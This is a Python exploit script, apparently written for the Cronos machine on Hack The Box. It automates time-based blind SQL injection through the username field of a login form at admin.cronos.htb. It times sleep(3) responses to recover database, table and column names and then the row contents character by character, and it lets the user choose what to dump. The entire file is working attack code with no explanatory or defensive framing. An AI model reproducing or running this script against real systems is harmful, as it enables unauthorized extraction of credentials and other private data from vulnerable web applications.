#!/usr/bin/python3

from pwn import *
import requests, signal, pdb, sys, time, string


# CTRL + C
def def_handler(sig, frame):
    log.failure("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

url = 'http://admin.cronos.htb/index.php'
s = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
result = ''
result_tablas = ''
result_columnas = ''
result_filas = ''
# 33 + 26 + 26 + 10


p3 = log.progress("Number of databases")
#p4 = log.progress("Total databases")


# Contador nº de bases de datos



def SQLI(payload):

    data_bases  = {
        'username': '%s' % payload,            
        'password': 'test'
     }
    
    time_start = time.time()
    databases = requests.post(url, data=data_bases)
    time_end = time.time()


    if time_end - time_start > 3:
        return 1


for t in range(0, 30):
       
    #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
    payload = "' or if(((SELECT COUNT(*) FROM information_schema.schemata) = '%s'),sleep(3),1)-- -" % (t)
    p3.status("%s" % payload)

    if SQLI(payload):
        total = t
        #p4.status("%s" % total)
        break

log.info("Total databases: %s" % total)


# Longitud nombres bases de datos 



longitudes = []

for i in range(0, total):
    for t in range(0, 30):
       
        #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
        payload = "' or if(((SELECT CHARACTER_LENGTH(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET %d) = '%d'),sleep(3),1)-- -" % (i, t)

        p3.status("%s" % payload)

        if SQLI(payload):
            longitudes.append(t)
                        #p4.status("%s" % total)
            break

i = 0
for long in longitudes:
    i = i+1
    log.info("Nº caracteres database %d: %d" % (i, long))


# dump nombres bases de datos



p1 = log.progress("")
p2 = log.progress("Payload")
nombres = []

for i in range(0, total):
    #count = 0

    for j in range(1, longitudes[i] + 1):
        for c in s:
            #payload = "' or if(substr(database(),%d,1)='%c',sleep(3),1)-- -" % (i, c)
            payload = "' or IF(SUBSTR((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET %d), '%d', 1) = '%c', sleep(3), 1)-- -" % (i, j, c)
            #count = count + 1
            #if (count > 95):
            #   break
            p2.status("%s" % payload)

            if SQLI(payload):
                result += c
                num = i + 1
                p1.status("Database %s: %s" % (num, result))
                break
    
    nombres.append(result)
    result = ''

n = 0
for nombre in nombres:
    print("[%d] %s" % (n, nombre))
    n = n + 1 


dump = int(input("Selecciona la base de datos: "))
db = nombres[dump]
print(db)


# Contador de tablas



p5 = log.progress("Number of tables")

for t in range(0, 30):
       
    #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
    payload = "' or if(((select count(*) from information_schema.tables where table_schema = '%s') = %s),sleep(3),1)-- -" % (db, t)
    p5.status("%s" % payload)

    if SQLI(payload):
        total_tables = t
        #p4.status("%s" % total)
        break

log.info("Total tables: %s" % total_tables)


# Longitud nombres tablas 


p6 = log.progress("Number of tables")


longitudes_tablas = []

for i in range(0, total_tables):
    for t in range(0, 30):
       
        #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
        payload = "' or if(((SELECT CHARACTER_LENGTH(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES where table_schema = '%s' LIMIT 1 OFFSET %d) = '%d'),sleep(3),1)-- -" % (db, i, t)

        p6.status("%s" % payload)

        if SQLI(payload):
            longitudes_tablas.append(t)
                        #p4.status("%s" % total)
            break

i = 0
for long in longitudes_tablas:
    i = i+1
    log.info("Nº caracteres de la tabla %d: %d" % (i, long))


# dump nombres tablas



p7 = log.progress("")
p8 = log.progress("Payload")
nombres_tablas = []

for i in range(0, total_tables):
    #count = 0

    for j in range(1, longitudes_tablas[i] + 1):
        for c in s:
            #payload = "' or if(substr(database(),%d,1)='%c',sleep(3),1)-- -" % (i, c)
            payload = "' or IF(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '%s' LIMIT 1 OFFSET %d), '%d', 1) = '%c', sleep(3), 1)-- -" % (db, i, j, c)
            #count = count + 1
            #if (count > 95):
            #   break
            p8.status("%s" % payload)

            if SQLI(payload):
                result_tablas += c
                num = i + 1
                p7.status("Table %s: %s" % (num, result_tablas))
                break
    
    nombres_tablas.append(result_tablas)
    result_tablas = ''

n = 0
for nombre in nombres_tablas:
    print("[%d] %s" % (n, nombre))
    n = n + 1 


dump_t = int(input("Selecciona la tabla: "))
tabla = nombres_tablas[dump_t]
print(tabla)



# Contador de columnas



p9 = log.progress("Number of columns")

for t in range(0, 30):
       
    #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
    payload = "' or if(((select count(*) from information_schema.columns where table_schema = '%s' and table_name = '%s') = %s),sleep(3),1)-- -" % (db, tabla, t)
    p9.status("%s" % payload)

    if SQLI(payload):
        total_columns = t
        #p4.status("%s" % total)
        break

log.info("Total columns: %s" % total_columns)




# Longitud nombres columnas


p12 = log.progress("")


longitudes_columnas = []

for i in range(0, total_columns):
    for t in range(0, 30):
       
        #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
        payload = "' or if(((SELECT CHARACTER_LENGTH(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '%s' AND TABLE_NAME = '%s' limit 1 offset %d) = '%d'),sleep(3),1)-- -" % (db, tabla, i, t)


        p12.status("%s" % payload)

        if SQLI(payload):
            longitudes_columnas.append(t)
                        #p4.status("%s" % total)
            break

i = 0
for long in longitudes_columnas:
    i = i+1
    log.info("Nº caracteres de la columna %d: %d" % (i, long))



# dump nombres columns



p10 = log.progress("")
p11 = log.progress("Payload")
nombres_columnas = []

for i in range(0, total_columns):
    #count = 0

    for j in range(1, longitudes_columnas[i] + 1):
        for c in s:
            #payload = "' or if(substr(database(),%d,1)='%c',sleep(3),1)-- -" % (i, c)
            payload = "' or IF(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '%s' AND TABLE_NAME = '%s' LIMIT 1 OFFSET %d), '%d', 1) = '%c', sleep(3), 1)-- -" % (db, tabla, i, j, c)


            #count = count + 1
            #if (count > 95):
            #   break
            p11.status("%s" % payload)

            if SQLI(payload):
                result_columnas += c
                num = i + 1
                p10.status("Table %s: %s" % (num, result_columnas))
                break
    
    nombres_columnas.append(result_columnas)
    result_columnas = ''

n = 0
for nombre in nombres_columnas:
    print("[%d] %s" % (n, nombre))
    n = n + 1 


dump_c = int(input("Selecciona la columna: "))
columna = nombres_columnas[dump_c]
print(columna)



# dump data


# Contador de filas



p13 = log.progress("")

for t in range(0, 30):
       
    #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
    payload = "' or if(((select count(%s) from %s) = %s),sleep(3),1)-- -" % (columna, tabla, t)
    p13.status("%s" % payload)


    if SQLI(payload):
        total_filas = t
        #p4.status("%s" % total)
        break

log.info("Total filas: %s" % total_filas)


# Longitud nombres filas


p12 = log.progress("rows: ")


longitudes_filas = []

for i in range(0, total_filas):
    for t in range(0, 40):
       
        #payload = "' or if(select count(*) from information_schema.schemata)='%s',sleep(3),1)-- -" % (t)
        payload = "' or if(((SELECT CHARACTER_LENGTH(%s) FROM %s limit 1 offset %d) = %d),sleep(3),1)-- -" % (columna, tabla, i, t)


        # IF((SELECT CHARACTER_LENGTH(nombre) from usuarios limit 1 offset 0) > 0, value_if_true, value_if_false)
        p12.status("%s" % payload)

        if SQLI(payload):
            longitudes_filas.append(t)
                        #p4.status("%s" % total)
            break

i = 0
for long in longitudes_filas:
    i = i+1
    log.info("Nº caracteres de la fila %d: %d" % (i, long))


# dump nombres filas


p14 = log.progress("")
p15 = log.progress("Payload")
nombres_filas = []

n = 0

for i in range(0, total_filas):
    #count = 0

    for j in range(1, longitudes_filas[i] + 1):
        for c in s:
            #payload = "' or if(substr(database(),%d,1)='%c',sleep(3),1)-- -" % (i, c)
            payload = "' or IF(SUBSTR((SELECT %s FROM %s LIMIT 1 OFFSET %d), '%d', 1) = '%c', sleep(3), 1)-- -" % (columna, tabla, i, j, c)


            #count = count + 1
            #if (count > 95):
            #   break
            p15.status("%s" % payload)

            if SQLI(payload):
                result_filas += c
                num = n + 1
                p10.status("Fila %s: %s" % (num, result_columnas))
                break
    
    nombres_filas.append(result_filas)
    result_filas = ''



for m, nombre in enumerate(nombres_filas):
    print("[%d] %s" % (m, nombre))
